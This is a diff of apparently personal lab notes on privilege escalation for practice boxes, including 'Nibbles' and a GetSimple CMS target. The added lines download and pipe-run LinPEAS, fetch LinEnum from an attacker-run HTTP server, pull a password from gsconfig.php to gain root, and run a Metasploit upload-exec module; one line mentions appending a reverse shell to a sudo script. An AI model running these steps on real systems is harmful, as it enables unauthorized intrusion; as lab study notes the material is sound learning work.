@@ -767,7 +767,7 @@ Nibbles - Privilege Escalation
 let us put this aside for now and pull in the https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 to perform automated privilege escalation checks.
 $sudo python3 -m http.server 8080  ->start http server
--> back on target type $wget http://<atkip>:8080/LinEnum.sh
+->  $wget http://<atkip>:8080/LinEnum.sh
 if success we see a 200 success response on python http server -> chmod +x LinEnum.sh -> run ./LinEnum.sh
 now we get root acc -> try to run /home/nibbler/personal/stuff/monitor.sh
 <if> append a reverse shell one-liner to the end of it and executed with sudo we should get a reverse shell back as the root user. 
@@ -880,3 +880,21 @@ su mrb3n
 sudo su - (su: "switch user" – đổi sang user khác (mặc định là root)
 -: tải môi trường login shell của user đó (/root/.bashrc, /etc/profile, v.v.))
 cat root.txt
+------------ Linpeas.sh
+curl -O https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > <filename>
+=> found config file gsconfig.php in /var/www/html
+=> cat gsconfig.php (P@ssw0rd)
+=>su mrb3n -> sudo su - -> c (get to the su shell) cat root.txt
+$python3 -m http.server 8080
+$wget http://<ip><port>/file.sh
+
+---------Tooling 10.129.186.22
+ msf > use exploit/unix/webapp/get_simple_cms_upload_exec
+    msf exploit(get_simple_cms_upload_exec) > show targets
+        ...targets...
+    msf exploit(get_simple_cms_upload_exec) > set TARGET < target-id >
+    msf exploit(get_simple_cms_upload_exec) > show options
+        ...show and set options...
+    msf exploit(get_simple_cms_upload_exec) > exploit
+
